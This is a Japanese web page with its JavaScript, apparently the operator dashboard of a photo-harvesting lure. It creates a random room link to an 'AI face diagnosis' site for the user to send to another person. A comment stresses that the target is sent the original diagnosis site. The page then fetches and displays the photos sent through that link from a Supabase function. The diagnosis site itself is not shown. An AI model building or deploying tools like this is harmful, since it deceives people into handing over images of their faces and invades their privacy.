<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>写真受信ボックス</title>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    sans-serif;

  background:
    linear-gradient(
      135deg,
      #667eea,
      #764ba2
    );

  min-height: 100vh;
  padding: 30px 15px;
  color: #222;
}

.container {
  max-width: 600px;
  margin: auto;
}

.card {
  background: white;
  border-radius: 20px;
  padding: 25px;
  box-shadow:
    0 10px 30px rgba(0,0,0,0.2);

  margin-bottom: 20px;
}

h1 {
  text-align: center;
  margin-top: 0;
}

h2 {
  margin-top: 0;
}

button {
  width: 100%;
  padding: 15px;
  border: none;
  border-radius: 12px;
  background: #667eea;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 10px;
}

button:hover {
  opacity: 0.9;
}

button:disabled {
  opacity: 0.5;
}

input {
  width: 100%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 10px;
  font-size: 16px;
}

.linkBox {
  margin-top: 20px;
  padding: 15px;
  background: #f3f3f3;
  border-radius: 12px;
  word-break: break-all;
}

.photo {
  width: 100%;
  border-radius: 12px;
  margin-top: 15px;
}

.photoItem {
  margin-bottom: 25px;
  padding-bottom: 20px;
  border-bottom: 1px solid #ddd;
}

.small {
  color: #666;
  font-size: 13px;
}

.hidden {
  display: none;
}

.success {
  background: #e8f5e9;
  color: #2e7d32;
  padding: 12px;
  border-radius: 10px;
  margin-top: 15px;
}

.error {
  background: #ffebee;
  color: #c62828;
  padding: 12px;
  border-radius: 10px;
  margin-top: 15px;
}

</style>
</head>

<body>

<div class="container">

  <div class="card">

    <h1>📸 写真受信ボックス</h1>

    <p>
      ランダムなリンクを作成して、
      そのリンクから送信された写真を確認できます。
    </p>

    <button id="createLinkButton">
      🔗 リンクを作成
    </button>

    <div id="linkArea" class="hidden">

      <h2>🔗 作成したリンク</h2>

      <div class="linkBox">
        <div id="generatedLink"></div>
      </div>

      <button id="copyButton">
        📋 リンクをコピー
      </button>

      <button id="openLinkButton">
        🌐 AI診断サイトを開く
      </button>

      <div id="successMessage" class="success hidden">
        リンクを作成しました！
      </div>

    </div>

  </div>


  <div class="card">

    <h2>📥 受信した写真</h2>

    <p class="small">
      作成したリンクから送信された写真を確認できます。
    </p>

    <button id="refreshButton">
      🔄 写真を確認
    </button>

    <div id="photoArea">
      <p class="small">
        まだ写真を取得していません。
      </p>
    </div>

  </div>

</div>


<script>

/*
  Supabase Edge Function
*/

const SUPABASE_FUNCTION =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


/*
  元のAI診断サイト
*/

const AI_DIAGNOSIS_SITE =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


/*
  HTML要素
*/

const createLinkButton =
  document.getElementById(
    "createLinkButton"
  );

const linkArea =
  document.getElementById(
    "linkArea"
  );

const generatedLink =
  document.getElementById(
    "generatedLink"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openLinkButton =
  document.getElementById(
    "openLinkButton"
  );

const successMessage =
  document.getElementById(
    "successMessage"
  );

const refreshButton =
  document.getElementById(
    "refreshButton"
  );

const photoArea =
  document.getElementById(
    "photoArea"
  );


/*
  現在のルームID
*/

let room =
  new URLSearchParams(
    window.location.search
  ).get("room");


/*
  URLにルームIDがなければ
  保存していたルームIDを使用
*/

if (!room) {

  room =
    localStorage.getItem(
      "receiverRoom"
    );

}


/*
  ランダムなルームIDを作る
*/

function makeRoomId() {

  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      characters[
        Math.floor(
          Math.random() *
          characters.length
        )
      ];

  }

  return result;

}


/*
  リンク作成
*/

createLinkButton.addEventListener(
  "click",
  () => {

    room =
      makeRoomId();


    /*
      自分のブラウザに保存
    */

    localStorage.setItem(
      "receiverRoom",
      room
    );


    /*
      ここが重要！

      相手に送るのは
      元のAI診断サイト
    */

    const link =
      AI_DIAGNOSIS_SITE +
      "?room=" +
      encodeURIComponent(
        room
      );


    generatedLink.textContent =
      link;


    /*
      ボタンから開けるように保存
    */

    openLinkButton.dataset.link =
      link;


    linkArea.classList.remove(
      "hidden"
    );

    successMessage.classList.remove(
      "hidden"
    );

    /*
      新しいルームなので
      写真表示をリセット
    */

    photoArea.innerHTML =
      "<p class='small'>まだ写真を取得していません。</p>";

  }
);


/*
  リンクコピー
*/

copyButton.addEventListener(
  "click",
  async () => {

    const link =
      generatedLink.textContent;

    if (!link) {
      return;
    }

    try {

      await navigator.clipboard.writeText(
        link
      );

      copyButton.textContent =
        "✅ コピーしました！";

      setTimeout(
        () => {

          copyButton.textContent =
            "📋 リンクをコピー";

        },
        2000
      );

    } catch (error) {

      alert(
        "コピーできませんでした。リンクを長押ししてコピーしてください。"
      );

    }

  }
);


/*
  AI診断サイトを開く
*/

openLinkButton.addEventListener(
  "click",
  () => {

    const link =
      openLinkButton.dataset.link;

    if (!link) {
      return;
    }

    window.open(
      link,
      "_blank"
    );

  }
);


/*
  写真取得
*/

refreshButton.addEventListener(
  "click",
  async () => {

    if (!room) {

      alert(
        "まだリンクを作成していません。"
      );

      return;

    }


    refreshButton.disabled =
      true;

    refreshButton.textContent =
      "📥 読み込み中...";


    try {

      const response =
        await fetch(
          SUPABASE_FUNCTION +
          "?room=" +
          encodeURIComponent(
            room
          )
        );


      if (!response.ok) {

        throw new Error(
          "取得失敗"
        );

      }


      const data =
        await response.json();


      photoArea.innerHTML =
        "";


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        photoArea.innerHTML =
          "<p class='small'>まだ写真は届いていません。</p>";

        return;

      }


      /*
        写真を表示
      */

      data.photos.forEach(
        (photo, index) => {

          const item =
            document.createElement(
              "div"
            );

          item.className =
            "photoItem";


          const title =
            document.createElement(
              "p"
            );

          title.textContent =
            "📷 写真 " +
            (index + 1);


          const image =
            document.createElement(
              "img"
            );

          image.className =
            "photo";

          image.src =
            photo.url;

          image.alt =
            "受信した写真";


          item.appendChild(
            title
          );

          item.appendChild(
            image
          );


          photoArea.appendChild(
            item
          );

        }
      );

    } catch (error) {

      console.error(
        error
      );

      photoArea.innerHTML =
        "<div class='error'>写真を取得できませんでした。</div>";

    } finally {

      refreshButton.disabled =
        false;

      refreshButton.textContent =
        "🔄 写真を確認";

    }

  }
);


/*
  すでにルームが保存されている場合
  自動的にリンクを表示
*/

if (room) {

  const link =
    AI_DIAGNOSIS_SITE +
    "?room=" +
    encodeURIComponent(
      room
    );


  generatedLink.textContent =
    link;


  openLinkButton.dataset.link =
    link;


  linkArea.classList.remove(
    "hidden"
  );

}

</script>

</body>
</html>
